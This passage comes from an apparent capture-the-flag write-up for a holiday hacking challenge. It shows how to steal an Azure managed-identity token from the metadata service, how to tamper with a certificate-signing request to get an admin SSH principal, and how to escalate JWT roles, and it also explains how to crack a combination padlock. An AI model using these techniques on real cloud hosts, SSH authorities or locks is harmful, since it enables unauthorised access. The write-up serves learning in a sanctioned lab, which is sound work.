<code>ssh-server-vm.santaworkshopgeeseislands.org</code>. ChatNPT suggested I upgrade the host to use SSH certificates, such a great idea! It even generated ready-to-deploy code for an Azure Function App so elves can request their own certificates. What a timesaver! I'm a little wary though. I'd appreciate it if you could take a peek and confirm everything's secure before I deploy this configuration to all the Geese Islands servers. Generate yourself a certificate and use the monitor account to access the host. See if you can grab my TODO list. If you haven't heard of SSH certificates, Thomas Bouve gave an introductory talk and demo on that topic recently. Oh, and if you need to peek at the Function App code, there's a handy Azure REST API endpoint which will give you details about how the Function App is deployed.</p>"},{"location":"objectives/o15/#hints","title":"Hints","text":"Azure VM Access Token <p>From: Sparkle Redberry Objective: Certificate SSHenanigans Azure CLI tools aren't always available, but if you're on an Azure VM you can always use the Azure REST API instead.</p> SSH Certificates Talk <p>From: Alabaster Snowball Objective: Certificate SSHenanigans Check out Thomas Bouve's talk and demo to learn all about how you can upgrade your SSH server configuration to leverage SSH certificates.</p> Azure Function App Source Code <p>From: Alabaster Snowball Objective: Certificate SSHenanigans The get-source-control Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from.</p>"},{"location":"objectives/o15/#solution","title":"Solution","text":"<p>Alabaster gives us a couple steps to get started with this challenge. Let's generate a certificate and SSH to the Azure server  <code>ssh-server-vm.santaworkshopgeeseislands.org</code>. Input your public key (generate a key pair if needed using the <code>ssh-keygen</code> command) into the website and a certificate is returned with the principal elf.  <pre><code>{\n    \"ssh_cert\": \"rsa-sha2-512-cert-v01@openssh.com AAAAIXJzYS1zaGEyLTUxMi1jZXJ0LXYwMUBvcGVuc3NoLmNvbQAAACYxMzM5OTA3NjA1NTk5NjIzNzIwOTAxNDk2MzI2MzAzNDU1Nzg4NgAAAAMBAAEAAAEBAKnfcOsxgxtV2XmR76ed9bUOgZKkKH/3XlwAfbXbOPs3VbToJvxBYWge3Da1GB4lgzWrzt5R+MEPFDM17CyPLs0Usiu+2X6vsuQPjDNnNOtwAVB2rVUeFJzzcFMVphNrre9MnQ5nT5yNFZV+IheHjSVKkbtqpPtCY1td2qz7eO7l3SM2lHfdiHGcLnds9Nofo/RbHNe7StD7kG/Tkz4voEH01qP4QvsNcc45EGTNg4pfkAQjvli46xfRtd5+6ngpSw7I+clv94FtmlTZtAdy0PHdrKyNDXBXbJhQMVqcJSU5KYYyMZSaKjbpcPlmvn+a1PAF8MZ1RyT1XXjhZWYO1usAAAAAAAAAAQAAAAEAAAAkMjRiYTdiMGItNTQ0NS00M2E1LWE1YjEtNmVlNDFkOTYxNGYzAAAABwAAAANlbGYAAAAAZXkU4QAAAABlngANAAAAAAAAABIAAAAKcGVybWl0LXB0eQAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACBpNhjTApiZFzyRx0UB/fkzOAka7Kv+wS9MKfj+qwiFhwAAAFMAAAALc3NoLWVkMjU1MTkAAABASv6iiGVkgpYv+9T/4cPgGyL5IgeA0Dnv4pIKpkFzqXEXDv2FC1njjTwRELGxW0o2I7ZRzMQ2otDTgmsItFgZAQ== \",\n    \"principal\": \"elf\"\n}\n</code></pre> Save this certificate as .pub file. Don't save the entire JSON object - only the ssh_cert value within double quotes. Taking a look at the certificate details we can confirm the file is formatted correctly.</p> <p><pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/.ssh]\n\u2514\u2500$ ssh-keygen -Lf id_rsa-cert.pub\nid_rsa-cert.pub:\n        Type: ssh-rsa-cert-v01@openssh.com user certificate\n        Public key: RSA-CERT SHA256:9UbR/yp8kLFHt1G2KYhyKqVh9OAVM8sGsT86masZ6NM\n        Signing CA: ED25519 SHA256:gvQLUkenLfTvsxJJzB8CpxgaA5lapSc9YEZZEnLudbk (using ssh-ed25519)\n        Key ID: \"948e7553-886a-49c1-ac51-07fbb8ddaae6\"\n        Serial: 1\n        Valid: from 2023-12-12T21:55:07 to 2024-01-09T22:00:07\n        Principals: \n                elf\n        Critical Options: (none)\n        Extensions: \n                permit-pty\n</code></pre> Let's login to the ssh server. After the initial login, we are taken to a SatTrackr application. Looks like a clue to a future challenge. We can return to the monitor prompt using Ctrl C. <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/.ssh]\n\u2514\u2500$ ssh -i id_rsa-cert.pub -i ~/.ssh/id_rsa monitor@ssh-server-vm.santaworkshopgeeseislands.org \n</code></pre> </p> <p><pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/.ssh]\n\u2514\u2500$ ssh -i id_rsa-cert.pub -i ~/.ssh/id_rsa monitor@ssh-server-vm.santaworkshopgeeseislands.org\nmonitor@ssh-server-vm:~$ \n</code></pre> Our goal is to find out what cookie cache Alabaster is going to implement, which sounds like we need to get access to the Alabaster's account. The other hints indicate that there is a way to view details of the Function App and where it is deployed from and since we don't have access to the Azure CLI tool, we'll need to use the Azure REST API. Let's see where those other hints lead us.</p> <p>According to the Get Source Control API documentation we can query the management API to get the source control information, but we need some parameter values first:</p> <p>subscriptionId resourceGroupName site name</p> <p><pre><code>GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01\n</code></pre> Through some ssearching, I found the Azure Instance Metadata Service, which returned the <code>subscriptionId</code> and <code>resourceGroup</code>, but did not return the correct site name. I also found that we need an access token to query the Azure REST API.</p> <p><pre><code>monitor@ssh-server-vm:/etc/ssh/auth_principals$ curl https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/ssh-server-vm/sourcecontrols/web?api-version=2022-03-01 \n{\"error\":{\"code\":\"AuthenticationFailed\",\"message\":\"Authentication failed. The 'Authorization' header is missing.\"}}\nmonitor@ssh-server-vm:/etc/ssh/auth_principals$ \n</code></pre> I found how to obtain an access token.</p> <p><pre><code>monitor@ssh-server-vm:~$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s\n{\"access_token\":\"&lt;ACCESSTOKENHERE&gt;\",\"client_id\":\"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce\",\"expires_in\":\"84387\",\"expires_on\":\"1702610755\",\"ext_expires_in\":\"86399\",\"not_before\":\"1702524055\",\"resource\":\"https://management.azure.com/\",\"token_type\":\"Bearer\"}\n</code></pre> And asked ChatGPT to help me format the curl command correctly:</p> See AI Assistance <p>My Prompt: how do I format a curl command option for an authorization header for Oauth ChatGPT Response: When using OAuth with curl, you typically include the access token in the Authorization header using the \"Bearer\" authentication scheme. Here's how you can format a curl command with the Authorization header for OAuth: <pre><code>curl -H \"Authorization: Bearer YOUR_ACCESS_TOKEN\" https://api.example.com/endpoint\n</code></pre> Replace YOUR_ACCESS_TOKEN with the actual OAuth access token you have obtained. Additionally, make sure to replace https://api.example.com/endpoint with the specific URL or endpoint you are interacting with.</p> <p>Now to get the correct site name. After some consideration, I remembered that the Azure101 challenge mentioned some of the information would be useful in the future so I headed back to Azure101 to see what I could find. To speed up my search I had ChatGPT help me format the Azure CLI command:</p> See AI Assistance <p>My Prompt: what is the command using Azure CLI to get a list of the functionapps related to the resourcegrop 'northpole-rg1' ChatGPT Response: To get a list of Azure Functions apps related to a specific resource group using the Azure CLI, you can use the following command: <pre><code>az functionapp list --resource-group northpole-rg1 --query \"[].name\" --output table\n</code></pre> Let's break down the command: az functionapp list: This is the Azure CLI command to list Azure Functions apps. --resource-group northpole-rg1: This specifies the resource group name, in this case, \"northpole-rg1\". --query \"[].name\": This uses JMESPath query syntax to extract only the names of the function apps from the output. --output table: This formats the output as a table for better readability. After running this command, you should see a table with the names of the function apps in the specified resource group. Adjust the resource group name as needed for your specific scenario.</p> <p><pre><code>az functionapp list --resource-group northpole-rg1 --query \"[].name\" | less\n&lt;SNIP&gt;\n    \"hostNames\": [\n      \"northpole-ssh-certs-fa.azurewebsites.net\"\n    ],\n    \"hostNamesDisabled\": false,\n    \"hostingEnvironmentProfile\": null,\n    \"httpsOnly\": false,\n    \"hyperV\": false,\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg\n1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa\",\n    \"identity\": {\n      \"principalId\": \"d3be48a8-0702-407c-89af-0319780a2aea\",\n      \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n      \"type\": \"SystemAssigned\",\n      \"userAssignedIdentities\": null\n    },\n&lt;SNIP&gt;\n    \"slotSwapStatus\": null,\n    \"state\": \"Running\",\n    \"storageAccountRequired\": false,\n    \"suspendedTill\": null,\n    \"tags\": {\n      \"create-cert-func-url-path\": \"/api/create-cert?code=candy-cane-twirl\",\n      \"project\": \"northpole-ssh-certs\"\n    },\n    \"targetSwapSlot\": null,\n    \"trafficManagerHostNames\": null,\n    \"type\": \"Microsoft.Web/sites\",\n    \"usageState\": \"Normal\",\n    \"virtualNetworkSubnetId\": null,\n    \"vnetContentShareEnabled\": false,\n    \"vnetImagePullEnabled\": false,\n    \"vnetRouteAllEnabled\": false\n     }\n]\n</code></pre> Now we have the information we need for the get-source-control API query: subscriptionId: 2b0942f3-9bca-484b-a508-abdae2db5e64 resourceGroupName: northpole-rg1 site name: northpole-ssh-certs-fa</p> <p><pre><code>curl -s -H \"Authorization: Bearer &lt;ACCESSTOKENHERE&gt;\" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01\n\n{\"id\":\"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web\",\"name\":\"northpole-ssh-certs-fa\",\"type\":\"Microsoft.Web/sites/sourcecontrols\",\"location\":\"East US\",\"tags\":{\"project\":\"northpole-ssh-certs\",\"create-cert-func-url-path\":\"/api/create-cert?code=candy-cane-twirl\"},\"properties\":{\"repoUrl\":\"https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa\",\"branch\":\"main\",\"isManualIntegration\":false,\"isGitHubAction\":true,\"deploymentRollbackEnabled\":false,\"isMercurial\":false,\"provisioningState\":\"Succeeded\",\"gitHubActionConfiguration\":{\"codeConfiguration\":null,\"containerConfiguration\":null,\"isLinux\":true,\"generateWorkflowFile\":true,\"workflowSettings\":{\"appType\":\"functionapp\",\"publishType\":\"code\",\"os\":\"linux\",\"variables\":{\"runtimeVersion\":\"3.11\"},\"runtimeStack\":\"python\",\"workflowApiVersion\":\"2020-12-01\",\"useCanaryFusionServer\":false,\"authType\":\"publishprofile\"}}}}\n</code></pre> We now have the source code location for the functionapp! https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa</p> <p>In the functionapp.py file we see how the principal is determined for the SSH certificate.</p> <pre><code>    principal = data.get(\"principal\", DEFAULT_PRINCIPAL)\n\n    if not isinstance(principal, str):\n        raise ValidationError(\"principal is not a string.\")\n\n    principal = principal.strip()\n    logging.info(\"Principal: %s\", principal)\n\n    if not principal.isalpha():\n        raise ValidationError(\"principal contains invalid characters.\")\n</code></pre> <p>Watching Thomas Bouve's KringleCon talk from one of our hints shows us how principal mappings can be used to leverage access to different accounts. This sounds like a good plan of action. Let's find out if there are principal mappings on this server:</p> <p><pre><code>monitor@ssh-server-vm:~$ cd /etc/ssh/\nmonitor@ssh-server-vm:/etc/ssh$ ls\nauth_principals  ssh_host_ed25519_key           ssh_host_rsa_key.pub\nca.pub           ssh_host_ed25519_key-cert.pub  sshd_config\nmoduli           ssh_host_ed25519_key.pub       sshd_config.d\nssh_config       ssh_host_rsa_key\nssh_config.d     ssh_host_rsa_key-cert.pub\nmonitor@ssh-server-vm:/etc/ssh$ cd auth_principals/\nmonitor@ssh-server-vm:/etc/ssh/auth_principals$ ls\nalabaster  monitor\nmonitor@ssh-server-vm:/etc/ssh/auth_principals$ cat alabaster \nadmin\nmonitor@ssh-server-vm:/etc/ssh/auth_principals$ cat monitor \nelf\nmonitor@ssh-server-vm:/etc/ssh/auth_principals$ \n</code></pre> Reviewing the files in <code>/etc/ssh/auth_principals</code>, we find that the alabaster user is mapped to <code>admin</code>. The monitor user is mapped to <code>elf</code>, consistent with our current SSH certificate. </p> <p>Going back to https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl, we can intercept the request using Burp and add the <code>admin</code> principal to the JSON object.</p> <p></p> <p>When the cert is generated it now has the <code>admin</code> principal. </p> <p></p> <p>When we save this cert and check the properties, we can confirm it is correct.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/.ssh]\n\u2514\u2500$ ssh-keygen -L -f holiday-cert.pub\nholiday-cert.pub:\n        Type: ssh-rsa-cert-v01@openssh.com user certificate\n        Public key: RSA-CERT SHA256:JemVFhjtV0Xk/yKC4qE2qceq0HhrzDUpm+FfIUUnhdg\n        Signing CA: ED25519 SHA256:gvQLUkenLfTvsxJJzB8CpxgaA5lapSc9YEZZEnLudbk (using ssh-ed25519)\n        Key ID: \"ed610ed2-2730-4530-b2ec-73079678d9bc\"\n        Serial: 1\n        Valid: from 2023-12-15T12:58:02 to 2024-01-12T13:03:02\n        Principals: \n                admin\n        Critical Options: (none)\n        Extensions: \n                permit-pty\n</code></pre> <p>Let's login to the SSH server as alabaster.</p> <p><pre><code>\u2514\u2500$ ssh -i holiday-cert.pub -i ~/.ssh/holiday alabaster@ssh-server-vm.santaworkshopgeeseislands.org\nWarning: Identity file holiday-cert.pub not accessible: No such file or directory.\nLast login: Fri Dec 15 17:59:23 2023 from 65.100.39.62\nalabaster@ssh-server-vm:~$ whoami\nalabaster\n</code></pre> When we look at the resources we have access to we see <code>alabaster_todo.md</code>, which contains the answer to the challenge objective.</p> <pre><code>alabaster@ssh-server-vm:~$ ls -la\ntotal 36\ndrwx------ 1 alabaster alabaster 4096 Nov  9 14:07 .\ndrwxr-xr-x 1 root      root      4096 Nov  3 16:50 ..\n-rw-r--r-- 1 alabaster alabaster  220 Apr 23  2023 .bash_logout\n-rw-r--r-- 1 alabaster alabaster 3665 Nov  9 17:03 .bashrc\ndrwxr-xr-x 3 alabaster alabaster 4096 Nov  9 14:07 .cache\n-rw-r--r-- 1 alabaster alabaster  807 Apr 23  2023 .profile\ndrwxr-xr-x 6 alabaster alabaster 4096 Nov  9 14:07 .venv\n-rw------- 1 alabaster alabaster 1126 Nov  9 14:07 alabaster_todo.md\ndrwxr-xr-x 2 alabaster alabaster 4096 Nov  9 14:07 impacket\nalabaster@ssh-server-vm:~$ cat alabaster_todo.md \n# Geese Islands IT &amp; Security Todo List\n\n- [X] Sleigh GPS Upgrade: Integrate the new \"Island Hopper\" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.\n- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.\n- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!\n- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.\n- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!\n- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.\n- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.\n</code></pre> <p>Answer</p> <p>Gingerbread</p>"},{"location":"objectives/o15/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>Oh my! I was so focused on the SSH configuration I completely missed the vulnerability in the Azure Function App. Why would ChatNPT generate code with such a glaring vulnerability? It's almost like it wanted my system to be unsafe. Could ChatNPT be evil? Thanks for the help, I'll go and update the application code immediately! While we're on the topic of certificates, did you know Active Directory (AD) uses them as well? Apparently the service used to manage them can have misconfigurations too. You might be wondering about that SatTrackr tool I've installed on the monitor account? Here's the thing, on my nightly stargazing adventures I started noticing the same satellite above Geese Islands. I wrote that satellite tracker tool to collect some additional data and sure enough, it's in a geostationary orbit above us. No idea what that means yet, but I'm keeping a close eye on that thing!</p>"},{"location":"objectives/o16/","title":"Game Cartridges: Vol 2","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o16/#objective","title":"Objective","text":"<p>Request</p> <p>Find the second Gamegosling cartridge and beat the game.</p> Tinsel Upatree <p>I can't believe I was actually able to find this underground cavern! I discovered what looked liike an old pirate map in the attic of one of those huts in Rainraster Cliffs, and it actually led somewhere! But now that I've seen where it leads, I think this might've been a bad idea. This place is scary! Maybe you want to take it from here? There are 3 buried treasures in total, each in its own uncharted area around Geese Islands. I've been searching for a bit, but the mustiness down here is making me sneeze! Maybe you'll be able to find it. Here, use my Gameboy Cartridge Detector. Go into your items and test it to make sure it's still working. When you get close to the treasure, it'll start sounding off. The closer you get, the louder the sound. No need to activate or fiddle with it. It just works! I bet it's somewhere right... near... ACHOOO! If you find the treasure, come back and show me, and I'll tell you what I was able to research about it. Good luck! Whoa, you found it! What version is it? Did you know that many games had multiple versions released? Word is: volume 2 has 2 versions!</p>"},{"location":"objectives/o16/#hints","title":"Hints","text":"Gameboy 2 <p>From: Tinsel Upatree Objective: Game Cartridges: Vol 2 Try poking around Pixel Island. There really aren't many places you can go here, so try stepping everywhere and see what you get!</p> Gameboy 2 <p>From: Tinsel Upatree Objective: Game Cartridges: Vol 2 1) This feels the same, but different! 2) If it feels like you are going crazy, you probably are! Or maybe, just maybe, you've not yet figured out where the hidden ROM is hiding. 3) I think I may need to get a DIFFerent perspective. 4) I wonder if someone can give me a few pointers to swap.</p>"},{"location":"objectives/o16/#solution","title":"Solution","text":"<p>TBD</p> <p>Answer</p> <p>TBD</p>"},{"location":"objectives/o16/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>TBD</p>"},{"location":"objectives/o17/","title":"Faster Lock Combination","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o17/#objective","title":"Objective","text":"<p>Request</p> <p>Over on Steampunk Island, Bow Ninecandle is having trouble opening a padlock. Do some research and see if you can help open it!</p> Bo Ninecandle <p>Hey there! I'm Bow Ninecandle, and I've got a bit of a... 'pressing' situation. You see, I need to get into the lavatory, but here's the twist: it's secured with a combination padlock. Talk about bad timing, right? I could really use your help to figure this out before things get... well, urgent. I'm sure there are some clever tricks and tips floating around the web that can help us crack this code without too much of a flush... I mean fuss. Remember, we're aiming for quick and easy solutions here - nothing too complex. Once we've gathered a few possible combinations, let's team up and try them out. I'm crossing my legs - I mean fingers - hoping we can unlock this door soon. After all, everyone knows that the key to holiday happiness is an accessible lavatory! Let's dive into this challenge and hopefully, we won't have to 'hold it' for too long! Ready to help me out?</p>"},{"location":"objectives/o17/#solution","title":"Solution","text":"<p>The tricky part of this challenge is making sure the Tension status is the correct color for the step you are working on. Green is no tension, Brown is medium tension, and Red is high tension.</p> <p>Tip</p> <p>If you have trouble with the tension colors being consistent as you work through the steps, switching browsers may help.</p> Green Brown Red <p>The video by the HelpfulLockPicker that Bo Ninecandle mentioned is the only information needed to complete the challenge. I found it easiest to follow along with the video and complete each step as I watched. Each session of the challenge has a different combination, but I'll detail my calculations for the combination I had below:</p> <p>Sticky number: 17 Guess numbers: 8, 9</p> <p>First Digit: Sticky # (17) + 5 = 22</p> <p>Third Digit: 22/4 = 5 with a remainder 2</p> <p>Take the two guess numbers and add 10, repeat 3 times:</p> Guess # +10 +10 +10 8 18 28 38 9 19 29 39 <p>Find the numbers in the above table that when divded by 4 also have a remainder of 2: 18 and 38</p> <p>The video states you can look for the number that feels looser when putting heavy tension on the lock and manipulating the dial. Virtually, I had a difficult time deciding which number felt looser so I continued on with the plan to try all 16 combinations instead of trying to narrow it down to 8 combinations.</p> <p>Second Digit: Remainder from the previous section (2) + 2 = 4 remainder (2) + 2 + 4 = 8</p> <p>Take those two numbers and add 8, repeat 4 times:</p> # +8 +8 +8 +8 4 12 20 28 36 8 16 24 32 0 <p>Tip</p> <p>The combination can not go over 39 so any number above that starts again at 0 (e.g., 40 = 0, 41 = 1)</p> <p>The second and third digits must be greater than 2 away from each other so we can disregard any numbers that are 2 digits away from 18 or 38. The possible combinations now look like this:</p> <p>Option A: First: 22 Second: 4, 12, 28, 36, 8, 24, 32, 0 Third: 18</p> <p>OR</p> <p>Option B: First: 22 Second: 4, 12, 20, 28, 8, 16, 24, 32  Third: 38</p> <p>When trying each combination, my challenge completed using this combination: 22 - 0 - 18</p> <p>Answer</p> <p>22 - 0 - 18 (your answer will be different)</p>"},{"location":"objectives/o17/#response","title":"Response","text":"<p>Bo Ninecandle</p> <p>Oh, thank heavens! You're a lifesaver! With your knack for cracking codes, we've just turned a potential 'loo catastrophe' into a holiday triumph!</p>"},{"location":"objectives/o18/","title":"The Captain's Comms","text":"<p>Difficulty:  Direct link: Objective 3 terminal</p>"},{"location":"objectives/o18/#objective","title":"Objective","text":"<p>Request</p> <p>Speak with Chimney Scissorsticks on Steampunk Island about the interesting things the captain is hearing on his new Software Defined Radio. You'll need to assume the GeeseIslandsSuperChiefCommunicationsOfficer role.</p> Chimney Scissorsticks <p>Heya, think you could help Piney Sappington on Rainraster Cliffs on Pixel Island and then give me a hand? Ahoy there, I'm Chimney Scissorsticks! You may have noticed some mischief-makers planning to stir up trouble ashore. They've made many radio broadcasts which the captain has been monitoring with his new software defined radio (SDR). The new SDR uses some fancy JWT technology to control access. The captain has a knack for shortening words, some sorta abbreviation trick. Not familiar with JWT values? No worries; just think of it as a clue-solving game. I've seen that the Captain likes to carry his journal with him wherever he goes. If only I could find the planned \"go-date\", \"go-time\", and radio frequency they plan to use. Remember, the captain's abbreviations are your guiding light through this mystery! Once we find a JWT value, these villains won't stand a chance. The closer we are, the sooner we'll be thwarting their pesky plans! We need to recreate an administrative JWT value to successfully transmit a message. Good luck, matey! I've no doubts about your cleverness in cracking this conundrum!</p>"},{"location":"objectives/o18/#hints","title":"Hints","text":"Comms Journal <p>From: Chimney Scissorsticks Terminal: The Captain's Comms I've seen the Captain with his Journal visiting Pixel Island!</p> Comms JWT Intro <p>From: Chimney Scissorsticks Terminal: The Captain's Comms A great introduction to JSON Web Tokens is available from Auth0.</p> Comms Private Key <p>From: Chimney Scissorsticks Terminal: The Captain's Comms Find a private key, update an existing JWT!</p> Comms Web Interception Proxies <p>From: Chimney Scissorsticks Terminal: The Captain's Comms Web Interception proxies like Burp and Zap make web sites fun!</p> Comms Abbreviations <p>From: Chimney Scissorsticks Terminal: The Captain's Comms I hear the Captain likes to abbreviate words in his filenames; shortening some words to just 1,2,3, or 4 letters.</p>"},{"location":"objectives/o18/#solution","title":"Solution","text":"<p>Reviewing the hints, journal, and background text, we have a good idea of what we need to do for this challenge. Find the \"go-date\", \"go-time\", and \"radio frequency\" and transmit that information. Since this challenge involves JWTs, we most likely will need to be a different user in order to complete these steps. </p> <p>When we enter the Captain's Communcation room, we have a number of items that are interactable. In addition to the many hints we have, words in all capital letters that are sprinkled throughout provide additional clues for navigating through the challenge. </p> <p></p> <p>Now we know some important information: radioUser: lowest level user radioMonitor: can view signals radioDecoder: can decode signals The radioMonitor token is in <code>/jwtDefault/rMonitor.tok</code>. To use the transmitter we need an admin token for the GeeseIslandsSuperChiefCommunicationsOfficer role. </p> <p>When we try to access the SDR, we get an access denied message. Looks like we need to get the radioMonitor role first.</p> <p></p> <p>I don't see any terminal to access that would allow us to get access to that <code>rMonitor.tok</code> file. Let's take a look at the requests in Burp. Clicking on the SDR again and intercepting the request with Burp, we can see the GET request to <code>/checkRole</code> URI and a <code>justWatchThisRole</code> cookie. Decoding this JWT shows that we currently have the radioUser role.</p> <p><pre><code>{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\"\n}\n{\n  \"iss\": \"HHC 2023 Captain's Comms\",\n  \"iat\": 1699485795.3403327,\n  \"exp\": 1809937395.3403327,\n  \"aud\": \"Holiday Hack 2023\",\n  \"role\": \"radioUser\"\n}\n</code></pre> Since there isn't obvious terminal access, we can make requests to the SDR using Burp.</p> <p></p> <p>We've received a 200 response with a JWT and it decodes to the radioMonitor role. <pre><code>{\n  \"iss\": \"HHC 2023 Captain's Comms\",\n  \"iat\": 1699485795.3403327,\n  \"exp\": 1809937395.3403327,\n  \"aud\": \"Holiday Hack 2023\",\n  \"role\": \"radioMonitor\"\n}\n</code></pre> Let's try accessing the SDR again with the radioMonitor role token.</p> <p>Tip</p> <p>Remember to modify the Cookie and the Authorization header in the requests.</p> <p></p> <p></p> <p>In order to interact with the highlighted signals, we need the radioDecoder role. Since the Captain likes to shorten his filenames, let's match the same format that was used for the <code>rMonitor.tok</code> file and see if we can find the radioDecoder token.</p> <p></p> <p><pre><code>{\n  \"iss\": \"HHC 2023 Captain's Comms\",\n  \"iat\": 1699485795.3403327,\n  \"exp\": 1809937395.3403327,\n  \"aud\": \"Holiday Hack 2023\",\n  \"role\": \"radioDecoder\"\n}\n</code></pre> With the radioDecoder token, we can decode the 3 signals for more clues.</p> <p>Signal 1</p> <p></p> <p>Now we have a folder name for where the private key is stored <code>TH3CAPSPR1V4T3F0LD3R</code>.</p> <p>We also have some interesting radio tidbits that ChatGPT helped me decifer.</p> See AI Assistance <p>My Prompt:is there any context for this text in a coded message? It originated in a morse code message \"KH644\" ChatGPT Response:The text \"KH644\" doesn't immediately appear to be Morse code, as Morse code typically consists of dots and dashes (periods and hyphens) representing letters and numbers. However, it looks like a combination of letters and numbers. Without more context or information about the encoding method used, it's difficult to decipher its meaning. If it originated from a Morse code message, it's possible that \"KH644\" was derived from the Morse code and then encoded further using a different system. Without knowing the specific encoding method or having additional information, it's challenging to provide a definitive interpretation. If you have any details about how the Morse code was transformed into \"KH644\" or if there are any additional clues or context, please provide them. It could be part of a larger puzzle or code that requires a specific key or method to unravel. My Prompt:the entire message translated from morse code is: \"CQ CQ CQ DE KH644\" ChatGPT Response:Thank you for providing additional context. The Morse code message \"CQ CQ CQ DE KH644\" is a common radio communication format. Each element has a specific meaning: \"CQ\" is a general call inviting any station to respond. \"DE\" is an abbreviation for \"from\" in French and is often used in radio communication to indicate the transmitting station. \"KH644\" is likely a station identifier. So, the entire message \"CQ CQ CQ DE KH644\" is essentially an invitation for communication, broadcasting from the station with the identifier \"KH644.\" This kind of format is commonly used in amateur radio and other radio communication scenarios to initiate contact and establish communication with other stations. If you have more specific questions or if there's anything else you'd like to know about this message, feel free to ask!</p> <p>Signal 2</p> <p></p> <p>This message is confusing unless we have read the Just Watch This Appendix A - Decoder Index entry about the Lincolnshire Poacher. Even after reading more about number stations, the meaning of this message alluded me. After reviewing what information I was missing for the objective, I still needed the go-date and go-time. I asked ChatGPT for assistance.</p> See AI Assistance <p>My Prompt:what does this coded message mean? {music} {music} {music} 88323 88323 88323 {gong} {gong} {gong} {gong} {gong} {gong} 12249 12249 16009 16009 12249 12249 16009 16009 {gong} {gong} {gong} {gong} {gong} {gong} {music} {music} {music} ChatGPT Response:The coded message you provided appears to be a sequence of symbols, including \"{music}\" and \"{gong}\" along with numerical values. Without additional context or a specific code key, it's challenging to decipher the exact meaning of the message. If this is part of a puzzle or a specific code system, you might need more information or instructions to interpret it correctly. Alternatively, if it's a personal code or a creative expression, it could have a unique meaning known only to the creator. If you have any additional details or context, please provide them, and I'll do my best to help you understand the message. My Prompt:this message is related to number stations like the Lincolnshire Poacher - does that provided the needed context? ChatGPT Response:Ah, I see. Number stations are mysterious shortwave radio stations that transmit seemingly random sequences of numbers or letters. The Lincolnshire Poacher is one such infamous number station that used a melody resembling the English folk song \"The Lincolnshire Poacher\" as an identifier. Given this context, your coded message seems to follow a similar pattern, with placeholders like \"{music}\" and \"{gong}\" possibly representing specific sounds or signals, and the numerical values interspersed between them. The numbers might be part of a code or cipher, similar to how numbers in number stations are used to convey messages. Unfortunately, without a specific key or information on how to decode the message, it's challenging to provide a precise interpretation. If you have additional details or a decoding key, I could attempt to help further. Otherwise, it might remain a mystery or a creative expression inspired by number stations. My Prompt:does this message mean anything in the context of a coded date or time? 12249 12249 16009 16009 12249 12249 16009 16009 ChatGPT's Response:The sequence of numbers you provided, \"12249 12249 16009 16009 12249 12249 16009 16009,\" doesn't immediately resemble a standard representation of a date or time. In many coding systems or ciphers, numbers might be used to represent letters or have specific meanings, but without additional information about the encoding method, it's challenging to decipher. If this sequence is part of a coded message related to a date or time, it could be encoded in a specific way unique to the context or system used. For example, in some cases, numbers might represent letters using a simple substitution cipher, or they might be part of a more complex cryptographic scheme. If you have any additional information about the encoding method, key, or context surrounding the message, please provide it, and I'll do my best to help you interpret it. Otherwise, decoding this sequence without more information could be challenging.</p> <p>I did some more reading about number station messages and they often required a one-time pad to decode them. I looked through the available information and didn't find one, but after staring at the message section for way too long, I did see a possible data and time. By removing the trailing '9' from each group of numbers, we have 1224 and 1600. In keeping with the holiday theme, 1224 could be a date of Christmas Eve and 1600 could be a time since the clock in the Comms room is set to a 24 hour clock.</p> <p></p> <p>Signal 3</p> <p></p> <p>This signal was easy in comparison to decifer - a map of the Geese Islands with the radio frequency - 10426 Hz.</p> <p>Transmitter Access</p> <p>Now that we have the information for the transmission, we need access to the transmitter. We need to generate a token for the <code>GeeseIslandsSuperChiefCommunicationsOfficer</code> role. The public key location is noted in the Captain's Initial To-Do list: <code>/jwtDefault/keys/capsPubKey.key</code>. </p> <p></p> <p>We can also piece together the private key location.  The private key is in a \"folder I hope no one will find.\" This folder name was revealed in the Signal 1 message. Since the private key is, well, a 